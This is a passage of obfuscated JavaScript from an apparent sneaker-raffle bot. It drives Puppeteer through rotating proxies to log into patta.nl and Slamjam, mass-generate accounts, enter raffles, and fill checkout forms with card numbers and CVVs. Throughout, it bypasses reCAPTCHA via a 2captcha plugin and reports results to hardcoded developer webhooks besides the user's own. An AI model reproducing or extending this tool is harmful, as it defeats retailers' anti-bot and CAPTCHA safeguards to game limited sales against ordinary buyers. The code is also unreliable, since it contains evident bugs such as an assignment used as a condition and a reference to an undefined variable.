            console['log'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x54b84e + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x152d8a['useRandomProxy'] = ![])
            var _0x10a791 = _0xaecdd9[_0x54b84e]['split'](':');
        else
            var _0x520707 = Math['round'](Math['random']() * (_0xaecdd9['length'] - 0x1)), _0x10a791 = _0xaecdd9[_0x520707]['split'](':');
        const _0x19f49a = await _0x10a68d['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x10a791[0x0] + ':' + _0x10a791[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x455cea = await _0x19f49a['newPage']();
            await _0x455cea['authenticate']({
                'username': '' + _0x10a791[0x2],
                'password': '' + _0x10a791[0x3]
            }), console['log'](_0xfa2bb1() + '\x20[' + _0x5e10d4['name'] + ']\x20Task\x20' + (_0x54b84e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x455cea['setRequestInterception'](!![]), _0x455cea['on']('request', _0x122480 => {
                _0x122480['resourceType']() === 'image' || _0x122480['resourceType']() === 'font' || _0x122480['resourceType']() === 'media' ? _0x122480['abort']() : _0x122480['continue']();
            }), await _0x455cea['goto']('https://www.patta.nl/nl/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x455cea['waitForSelector']('#CustomerEmail'), console['log'](_0xfa2bb1() + '\x20[' + _0x5e10d4['name'] + ']\x20Task\x20' + (_0x54b84e + 0x1) + '\x20:\x20Logging\x20in..'), await _0x455cea['type']('#CustomerEmail', '' + _0x1c12e4[_0x54b84e]['Email']), await _0xfe9813(0x12c), await _0x455cea['type']('#CustomerPassword', '' + _0x1c12e4[_0x54b84e]['Password']), await _0xfe9813(0x226), await _0x455cea['$eval']('#customer_login', _0x3d238b => _0x3d238b['submit']());
            try {
                await _0x455cea['waitForSelector']('#orders'), await _0xfe9813(0x4b0);
            } catch {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x5e10d4['name'] + ']\x20Task\x20' + (_0x54b84e + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x455cea['goto']('' + _0x1c12e4[_0x54b84e]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0xfe9813(0xbb8), console['log'](_0xfa2bb1() + '\x20[' + _0x5e10d4['name'] + ']\x20Task\x20' + (_0x54b84e + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x455cea['waitForSelector']('#email');
            } catch {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x5e10d4['name'] + ']\x20Task\x20' + (_0x54b84e + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
            }
            await _0x455cea['type']('#email', '' + _0x1c12e4[_0x54b84e]['Email']), await _0xfe9813(0x384), await _0x455cea['type']('#first_name', '' + _0x1c12e4[_0x54b84e]['FirstName']), await _0xfe9813(0x514), await _0x455cea['type']('#last_name', '' + _0x1c12e4[_0x54b84e]['LastName']), await _0xfe9813(0x514), await _0x455cea['type']('#street_address', _0x1c12e4[_0x54b84e]['Address1'] + '\x20' + _0x1c12e4[_0x54b84e]['HouseNumber'] + '\x20' + _0x1c12e4[_0x54b84e]['Address2']), await _0xfe9813(0x2bc);
            _0x1c12e4[_0x54b84e]['Postcode'] == undefined && (_0x1c12e4[_0x54b84e]['Postcode'] = _0x1c12e4[_0x54b84e]['Zip']);
            await _0x455cea['type']('#zip_code', '' + _0x1c12e4[_0x54b84e]['Postcode']), await _0xfe9813(0x320), await _0x455cea['type']('#city', '' + _0x1c12e4[_0x54b84e]['City']), await _0xfe9813(0x320), await _0x455cea['type']('#bday', '01/01/1994'), await _0xfe9813(0x320), await _0x455cea['type']('#instagram', '' + _0x1c12e4[_0x54b84e]['Follower']), await _0xfe9813(0x352);
            if (_0x1c12e4[_0x54b84e]['Size'] == 'RANDOM') {
                const _0xd0b5b9 = await _0x455cea['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x1a2d09 => {
                    return _0x1a2d09['map'](_0x5fa3ff => _0x5fa3ff['textContent']);
                });
                var _0x23a97d = Math['round'](Math['random']() * (_0xd0b5b9['length'] - 0x1));
                console['log'](_0xfa2bb1() + '\x20[' + _0x5e10d4['name'] + ']\x20Task\x20' + (_0x54b84e + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0xd0b5b9[_0x23a97d]), await _0x455cea['click']('label[data-eu-size=\x22' + _0xd0b5b9[_0x23a97d] + '\x22]');
            } else {
                console['log'](_0xfa2bb1() + '\x20[' + _0x5e10d4['name'] + ']\x20Task\x20' + (_0x54b84e + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x1c12e4[_0x54b84e]['Size']);
                try {
                    await _0x455cea['click']('label[data-eu-size=\x22' + _0x1c12e4[_0x54b84e]['Size'] + '\x22]');
                } catch {
                    await _0x455cea['click']('label[data-eu-size=\x22' + _0x1c12e4[_0x54b84e]['Size'] + '.0\x22]');
                }
            }
            await _0xfe9813(0xbb8), await _0x455cea['$$eval']('.raffle__checkbox-label', _0x10e311 => _0x10e311['forEach'](_0x3d49c4 => _0x3d49c4['click']())), await _0xfe9813(0x7d0), console['log'](_0xfa2bb1() + '\x20[' + _0x5e10d4['name'] + ']\x20Task\x20' + (_0x54b84e + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x455cea['click']('#raffle__form-submit'), await _0xfe9813(0x1388);
            try {
                await _0x455cea['waitForSelector']('#raffle__confirmation-message-container'), console['log'](_0x298364['green'](_0xfa2bb1() + '\x20[' + _0x5e10d4['name'] + ']\x20Task\x20' + (_0x54b84e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x51f57e) {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x54b84e + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x51f57e));
            }
        } catch (_0x22a81c) {
            console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x54b84e + 0x1) + '\x20:\x20' + _0x22a81c)), _0x1dabc5 = 'yes';
        } finally {
            _0x19f49a && _0x19f49a['close']();
            if (_0x1dabc5 == 'yes' && _0xc7e290 != 0x5) {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x5e10d4['name'] + ']\x20Task\x20' + (_0x54b84e + 0x1) + '\x20:\x20Retrying')), _0x54b84e = _0x54b84e - 0x1, _0xc7e290 = _0xc7e290 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x152d8a['delay'] + '\x20ms'), await _0xfe9813(_0x152d8a['delay']);
        }
    }
}
async function _0x9f830d(_0x24984c, _0x106bcd, _0x152361, _0x154b98) {
    _0x10a68d['use'](_0x2db5c5()), _0x10a68d['use'](_0x28dbad({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x152d8a['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x8912d3 = 0x0; _0x8912d3 < _0x152361['length']; _0x8912d3++) {
        var _0x53ff0f = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x550f31
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x152d8a['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x112c11
                }
            ]
        }];
        const _0x28fdc8 = { 'embeds': _0x53ff0f };
        _0x193d7e(_0x106bcd['name'] + '\x20Task\x20' + (_0x8912d3 + 0x1) + '\x20/\x20' + _0x152361['length'] + '\x20||\x20File:\x20' + _0x3c9379 + '\x20Proxies:\x20' + _0x54e8a7), await _0x82271d(_0x152361, _0x8912d3);
        var _0x4d850b = await _0x5a270a(_0x152361[_0x8912d3], _0x106bcd, 'acc', ![]);
        const _0x41cc8d = { 'succesDEVMSG': { 'embeds': [_0x4d850b] } };
        if (_0x152361[_0x8912d3]['Email'] == '' || _0x152361[_0x8912d3]['FirstName'] == '' || _0x152361[_0x8912d3]['LastName'] == '') {
            console['log'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x8912d3 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xfe9813(0x7d0);
            continue;
        }
        (_0x152361[_0x8912d3]['Password'] == '' || _0x152361[_0x8912d3] == undefined) && _0x152361[_0x8912d3]['Password'] == 'JRaffles23!';
        if (_0x152d8a['useRandomProxy'] = ![])
            var _0x3637e2 = _0x154b98[_0x8912d3]['split'](':');
        else
            var _0x129983 = Math['round'](Math['random']() * (_0x154b98['length'] - 0x1)), _0x3637e2 = _0x154b98[_0x129983]['split'](':');
        const _0x2907b3 = await _0x10a68d['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x3637e2[0x0] + ':' + _0x3637e2[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x49878c = await _0x2907b3['newPage']();
            await _0x49878c['authenticate']({
                'username': '' + _0x3637e2[0x2],
                'password': '' + _0x3637e2[0x3]
            }), console['log'](_0xfa2bb1() + '\x20[' + _0x106bcd['name'] + ']\x20Task\x20' + (_0x8912d3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x49878c['setRequestInterception'](!![]), _0x49878c['on']('request', _0x329402 => {
                _0x329402['resourceType']() === 'image' || _0x329402['resourceType']() === 'font' || _0x329402['resourceType']() === 'media' ? _0x329402['abort']() : _0x329402['continue']();
            }), await _0x49878c['goto']('https://drop.slamjam.com/account/register'), await _0xfe9813(0xbb8), await _0x49878c['waitForSelector']('#FirstName'), await _0x49878c['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x49878c['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0xfa2bb1() + '\x20[' + _0x106bcd['name'] + ']\x20Task\x20' + (_0x8912d3 + 0x1) + '\x20:\x20Filling\x20information'), await _0xfe9813(0x4b0), await _0x49878c['type']('#FirstName', '' + _0x152361[_0x8912d3]['FirstName']), await _0xfe9813(0x226), await _0x49878c['type']('#LastName', '' + _0x152361[_0x8912d3]['LastName']), await _0xfe9813(0x226), await _0x49878c['type']('#Email', '' + _0x152361[_0x8912d3]['Email']), await _0xfe9813(0x2ee), await _0x49878c['type']('#ConfirmEmail', '' + _0x152361[_0x8912d3]['Email']), await _0xfe9813(0x2ee), await _0x49878c['type']('#CreatePassword', '' + _0x152361[_0x8912d3]['Password']), await _0xfe9813(0x2ee), await _0x49878c['type']('#CreateConfirmPassword', '' + _0x152361[_0x8912d3]['Password']), await _0xfe9813(0x226), console['log'](_0xfa2bb1() + '\x20[' + _0x106bcd['name'] + ']\x20Task\x20' + (_0x8912d3 + 0x1) + '\x20:\x20Submitting..'), await _0x49878c['$eval']('#create_customer', _0x26b365 => _0x26b365['submit']()), await _0xfe9813(0x1388), console['log'](_0xfa2bb1() + '\x20[' + _0x106bcd['name'] + ']\x20Task\x20' + (_0x8912d3 + 0x1) + '\x20:\x20' + _0x298364['cyan']('Solving\x20Captcha')), await _0x49878c['solveRecaptchas'](), console['log'](_0xfa2bb1() + '\x20[' + _0x106bcd['name'] + ']\x20Task\x20' + (_0x8912d3 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x49878c['$eval']('.shopify-challenge__container\x20>\x20form', _0x3cdc0e => _0x3cdc0e['submit']());
            try {
                await _0x49878c['waitForSelector']('.product-card__image'), await _0xfe9813(0x1f4), console['log'](_0x298364['green'](_0xfa2bb1() + '\x20[' + _0x106bcd['name'] + ']\x20Task\x20' + (_0x8912d3 + 0x1) + '\x20:\x20Account\x20' + _0x152361[_0x8912d3]['Email'] + '\x20Generated!')), _0x9cc7aa['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x152361[_0x8912d3]['Email'] + ',' + _0x152361[_0x8912d3]['Password']), console['log'](_0x298364['yellow'](_0xfa2bb1() + '\x20[' + _0x106bcd['name'] + ']\x20Task\x20' + (_0x8912d3 + 0x1) + '\x20:\x20Account\x20' + _0x152361[_0x8912d3]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                try {
                    _0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '' && await _0x3acacc(_0x152d8a['webhook'], _0x41cc8d['succesDEVMSG']);
                } catch {
                }
                await _0x3acacc(_0x303def, _0x41cc8d['succesDEVMSG']);
            } catch (_0x3c0252) {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x8912d3 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3c0252));
            }
        } catch (_0x361be6) {
            console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x8912d3 + 0x1) + '\x20:\x20' + _0x361be6));
        } finally {
            _0x2907b3 && _0x2907b3['close'](), console['log']('Waiting\x20for\x20' + _0x152d8a['delay'] + '\x20ms'), await _0xfe9813(_0x152d8a['delay']);
        }
    }
}
async function _0x4d121f(_0x3bbff9, _0x17542c, _0x2bb79f, _0x201fe0) {
    _0x10a68d['use'](_0x2db5c5()), _0x10a68d['use'](_0x28dbad({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x152d8a['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2e6ba7 = 0x0; _0x2e6ba7 < _0x2bb79f['length']; _0x2e6ba7++) {
        var _0x493313, _0x38db52 = '', _0x22f6ab = 0x0;
        _0x193d7e(_0x17542c['name'] + '\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20/\x20' + _0x2bb79f['length'] + '\x20||\x20File:\x20' + _0x3c9379 + '\x20Proxies:\x20' + _0x54e8a7), await _0x82271d(_0x2bb79f, _0x2e6ba7);
        if (_0x2bb79f[_0x2e6ba7]['Email'] == '' || _0x2bb79f[_0x2e6ba7]['Password'] == '' || _0x2bb79f[_0x2e6ba7]['FirstName'] == '' || _0x2bb79f[_0x2e6ba7]['LastName'] == '') {
            console['log'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x152d8a['useRandomProxy'] = ![])
            var _0x14bb9d = _0x201fe0[_0x2e6ba7]['split'](':');
        else
            var _0x85d9cd = Math['round'](Math['random']() * (_0x201fe0['length'] - 0x1)), _0x14bb9d = _0x201fe0[_0x85d9cd]['split'](':');
        const _0x2ce111 = await _0x10a68d['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x14bb9d[0x0] + ':' + _0x14bb9d[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials'
            ]
        });
        try {
            const _0x2d47b0 = await _0x2ce111['newPage']();
            await _0x2d47b0['authenticate']({
                'username': '' + _0x14bb9d[0x2],
                'password': '' + _0x14bb9d[0x3]
            }), await _0x2d47b0['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), console['log'](_0xfa2bb1() + '\x20[' + _0x17542c['name'] + ']\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2d47b0['setRequestInterception'](!![]), _0x2d47b0['on']('request', _0x57854d => {
                _0x57854d['resourceType']() === 'image' || _0x57854d['resourceType']() === 'font' || _0x57854d['resourceType']() === 'media' ? _0x57854d['abort']() : _0x57854d['continue']();
            }), await _0x2d47b0['goto']('https://drop.slamjam.com/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x2d47b0['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2d47b0['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xfe9813(0x258), await _0x2d47b0['waitForSelector']('#CustomerEmail'), console['log'](_0xfa2bb1() + '\x20[' + _0x17542c['name'] + ']\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2d47b0['type']('#CustomerEmail', '' + _0x2bb79f[_0x2e6ba7]['Email']), await _0xfe9813(0x12c), await _0x2d47b0['type']('#CustomerPassword', '' + _0x2bb79f[_0x2e6ba7]['Password']), await _0xfe9813(0x226), await _0x2d47b0['$eval']('#customer_login', _0x51c1e4 => _0x51c1e4['submit']()), await _0xfe9813(0x7d0), await _0x2d47b0['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0xfa2bb1() + '\x20[' + _0x17542c['name'] + ']\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20:\x20' + _0x298364['cyan']('Solving\x20Captcha')), await _0x2d47b0['solveRecaptchas'](), console['log'](_0xfa2bb1() + '\x20[' + _0x17542c['name'] + ']\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x2d47b0['$eval']('.shopify-challenge__container\x20>\x20form', _0x3d0a5d => _0x3d0a5d['submit']());
            try {
                await _0x2d47b0['waitForSelector']('.nav-account'), await _0xfe9813(0x4b0);
            } catch {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x17542c['name'] + ']\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x2d47b0['goto']('' + _0x2bb79f[_0x2e6ba7]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0xfe9813(0xbb8), console['log'](_0xfa2bb1() + '\x20[' + _0x17542c['name'] + ']\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x2d47b0['waitForSelector']('#ProductSelect-product-template-raffle');
            } catch {
            }
            await _0x2d47b0['click']('.product-select-variant-wrapper'), await _0xfe9813(0x320), await _0x2d47b0['click']('li.product-select-variant__value[data-size=\x22' + _0x2bb79f[_0x2e6ba7]['Size'] + '\x22]'), await _0xfe9813(0x384), await _0x2d47b0['$eval']('#AddToCartForm-product-template-raffle', _0x30b2f9 => _0x30b2f9['submit']()), await _0x2d47b0['waitForSelector']('.cart-order-summary__content'), await _0xfe9813(0x514), await _0x2d47b0['goto']('https://drop.slamjam.com/checkout'), await _0xfe9813(0x514), await _0x2d47b0['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0xfa2bb1() + '\x20[' + _0x17542c['name'] + ']\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2d47b0['select']('#checkout_shipping_address_country', '' + _0x2bb79f[_0x2e6ba7]['Country']), await _0xfe9813(0x200), await _0x2d47b0['waitForSelector']('#checkout_shipping_address_first_name'), await _0x2d47b0['type']('#checkout_shipping_address_first_name', '' + _0x2bb79f[_0x2e6ba7]['FirstName']), await _0xfe9813(0x237), await _0x2d47b0['type']('#checkout_shipping_address_last_name', '' + _0x2bb79f[_0x2e6ba7]['LastName']), await _0xfe9813(0x1e0), await _0x2d47b0['type']('#checkout_shipping_address_address1', _0x2bb79f[_0x2e6ba7]['Address1'] + '\x20' + _0x2bb79f[_0x2e6ba7]['HouseNumber']), await _0xfe9813(0x514), await _0x2d47b0['type']('#checkout_shipping_address_address2', '' + _0x2bb79f[_0x2e6ba7]['Address2']), await _0xfe9813(0x514);
            _0x2bb79f[_0x2e6ba7]['Postcode'] == undefined && (_0x2bb79f[_0x2e6ba7]['Postcode'] = _0x2bb79f[_0x2e6ba7]['Zip']);
            await _0x2d47b0['type']('#checkout_shipping_address_zip', '' + _0x2bb79f[_0x2e6ba7]['Postcode']), await _0xfe9813(0x2bc), await _0x2d47b0['type']('#checkout_shipping_address_city', '' + _0x2bb79f[_0x2e6ba7]['City']), await _0xfe9813(0x320), await _0x2d47b0['type']('#checkout_shipping_address_phone', '' + _0x2bb79f[_0x2e6ba7]['Phone']), await _0xfe9813(0x320), await _0x2d47b0['click']('#continue_button'), await _0xfe9813(0xbb8), await _0x2d47b0['waitForSelector']('.summary-title'), await _0xfe9813(0x320), await _0x2d47b0['click']('#continue_button'), await _0xfe9813(0x320), console['log'](_0xfa2bb1() + '\x20[' + _0x17542c['name'] + ']\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x2d47b0['waitForSelector']('#checkout_credit_card_vault'), await _0xfe9813(0x3e8);
            var _0xa9b0ea = await _0x2d47b0['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x250966 = await _0xa9b0ea['contentFrame']();
            await _0x250966['click']('#number'), await _0xfe9813(0x3e8), await _0x250966['type']('#number', '' + _0x2bb79f[_0x2e6ba7]['CardNumber'], { 'delay': 0x78 }), _0xa9b0ea = await _0x2d47b0['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x250966 = await _0xa9b0ea['contentFrame'](), await _0xfe9813(0x1c2), await _0x250966['click']('#name'), await _0xfe9813(0x1f4), await _0x250966['type']('#name', '' + _0x2bb79f[_0x2e6ba7]['NameOnCard'], { 'delay': 0x78 }), _0xa9b0ea = await _0x2d47b0['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x250966 = await _0xa9b0ea['contentFrame'](), await _0xfe9813(0x1c2), await _0x250966['click']('#expiry'), await _0xfe9813(0x1f4), await _0x250966['type']('#expiry', '' + _0x2bb79f[_0x2e6ba7]['ExpiryDate'], { 'delay': 0x78 }), _0xa9b0ea = await _0x2d47b0['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x250966 = await _0xa9b0ea['contentFrame'](), await _0xfe9813(0x1c2), await _0x250966['click']('#verification_value'), await _0xfe9813(0x1f4), await _0x250966['type']('#verification_value', '' + _0x2bb79f[_0x2e6ba7]['CVV'], { 'delay': 0x78 }), await _0x2d47b0['$eval']('#accepts-flag-raffle', _0x436305 => _0x436305['click']()), await _0xfe9813(0x7d0), console['log'](_0xfa2bb1() + '\x20[' + _0x17542c['name'] + ']\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x2d47b0['$eval']('#continue_button', _0x1c9263 => _0x1c9263['click']()), await _0xfe9813(0x1b58), await _0x2d47b0['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x2d47b0['$eval']('.edit_checkout.animate-floating-labels', _0x4f7a33 => _0x4f7a33['submit']()), await _0xfe9813(0x7d0);
            try {
                await _0x2d47b0['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), console['log'](_0x298364['green'](_0xfa2bb1() + '\x20[' + _0x17542c['name'] + ']\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x5b2131) {
                throw new Error('Error\x20Processing\x20Order:\x20' + _0x5b2131['message']);
            }
            var _0x5696d3 = await _0x5a270a(_0x2bb79f[_0x2e6ba7], _0x17542c, 'dev', ![]), _0x46ca6e = await _0x5a270a(_0x2bb79f[_0x2e6ba7], _0x17542c, 'pub', ![]);
            const _0x270a2f = {
                'succesDEVMSG': { 'embeds': [_0x5696d3] },
                'succesPUBMSG': { 'embeds': [_0x46ca6e] }
            };
            try {
                _0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '' && await _0x3acacc(_0x152d8a['webhook'], _0x270a2f['succesDEVMSG']), await _0xfe9813(0xc8), await _0x3acacc(_0xe7a394, _0x270a2f['succesDEVMSG']), await _0xfe9813(0xc8), await _0x3acacc(_0x1c5083, _0x270a2f['succesPUBMSG']);
            } catch (_0x2280fa) {
                console['log'](_0x298364['yellow'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2280fa));
            }
        } catch (_0x34539) {
            console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20:\x20' + _0x34539)), _0x493313 = '' + _0x34539;
            var _0x54d816 = await _0x5a270a(kickz[_0x2e6ba7], _0x17542c, 'dev', !![], _0x493313);
            EMBEDS['errorDEV'] = { 'embeds': [_0x54d816] }, _0x152d8a['webhook'] != undefined && _0x152d8a['webhook'] != '' && await _0x3acacc(_0x152d8a['webhook'], EMBEDS['errorDEV']), await _0x3acacc(_0x2c49ed, EMBEDS['errorDEV']), _0x38db52 = 'yes';
        } finally {
            _0x2ce111 && _0x2ce111['close']();
            if (_0x38db52 == 'yes' && _0x22f6ab != 0x5) {
                console['log'](_0x298364['red'](_0xfa2bb1() + '\x20[' + _0x17542c['name'] + ']\x20Task\x20' + (_0x2e6ba7 + 0x1) + '\x20:\x20Retrying')), _0x2e6ba7 = _0x2e6ba7 - 0x1, _0x22f6ab = _0x22f6ab + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x152d8a['delay'] + '\x20ms'), await _0xfe9813(_0x152d8a['delay']);
        }
    }
}
async function _0x2ffac0(_0x134ace, _0x212b62, _0x584961) {
    var _0x5521de = ![], _0xca7ceb = ![];
    if (_0x152d8a['captchaKey'] == '' || _0x152d8a['captchaKey'] == undefined)
        return console['log'](_0x298364['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
    _0x10a68d['use'](_0x2db5c5()), _0x10a68d['use'](_0x28dbad({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x152d8a['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x499459 = 0x0; _0x499459 < _0x212b62['length']; _0x499459++) {
        var _0x9e41eb, _0x2cd98f = [{
            'type': 'rich',
            'title': 'Succesful\x20JD\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'Product',
                    'value': '' + _0x212b62[_0x499459]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x212b62[_0x499459]['Size']
                },
                {
                    'name': 'User',
                    'value': '' + _0x550f31
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x152d8a['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x112c11
                }
            ]
        }];
        const _0x3820f1 = { 'embeds': _0x2cd98f };
        _0x193d7e(_0x134ace['name'] + '\x20Task\x20' + (_0x499459 + 0x1) + '\x20/\x20' + _0x212b62['length'] + '\x20||\x20File:\x20' + _0x3c9379 + '\x20Proxies:\x20' + _0x54e8a7), await _0x82271d(_0x212b62, _0x499459);
        var _0x2797ed = await _0x5a270a(_0x212b62[_0x499459], _0x134ace, 'dev', ![]), _0x3f87c6 = await _0x5a270a(_0x212b62[_0x499459], _0x134ace, 'pub', ![]);
        const _0x450599 = {
            'succesDEVMSG': { 'embeds': [_0x2797ed] },
            'succesPUBMSG': { 'embeds': [_0x3f87c6] }
        };
        if (_0x212b62[_0x499459]['Email'] == '' || _0x212b62[_0x499459]['Url'] == '' || _0x212b62[_0x499459]['FirstName'] == '' || _0x212b62[_0x499459]['LastName'] == '') {
            console['log'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Task\x20' + (_0x499459 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x152d8a['useRandomProxy'] = ![])
            var _0x57f3ea = _0x584961[_0x499459]['split'](':');
        else
            var _0x10caab = Math['round'](Math['random']() * (_0x584961['length'] - 0x1)), _0x57f3ea = _0x584961[_0x10caab]['split'](':');
        const _0x52b9f7 = await _0x10a68d['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x57f3ea[0x0] + ':' + _0x57f3ea[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x3444c3 = await _0x52b9f7['newPage']();
            await _0x3444c3['authenticate']({
                'username': '' + _0x57f3ea[0x2],
                'password': '' + _0x57f3ea[0x3]
            }), console['log'](_0xfa2bb1() + '\x20[' + _0x134ace['name'] + ']\x20Task\x20' + (_0x499459 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3444c3['setRequestInterception'](!![]), _0x3444c3['on']('request', _0x5dbf01 => {
                _0x5dbf01['resourceType']() === 'image' || _0x5dbf01['resourceType']() === 'font' || _0x5dbf01['resourceType']() === 'media' ? _0x5dbf01['abort']() : _0x5dbf01['continue']();
            }), await _0x3444c3['goto']('' + _0x212b62[_0x499459]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            });
            try {
                await _0x3444c3['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
            } catch {
                throw new Error('Not\x20an\x20Active\x20Raffle');
            }
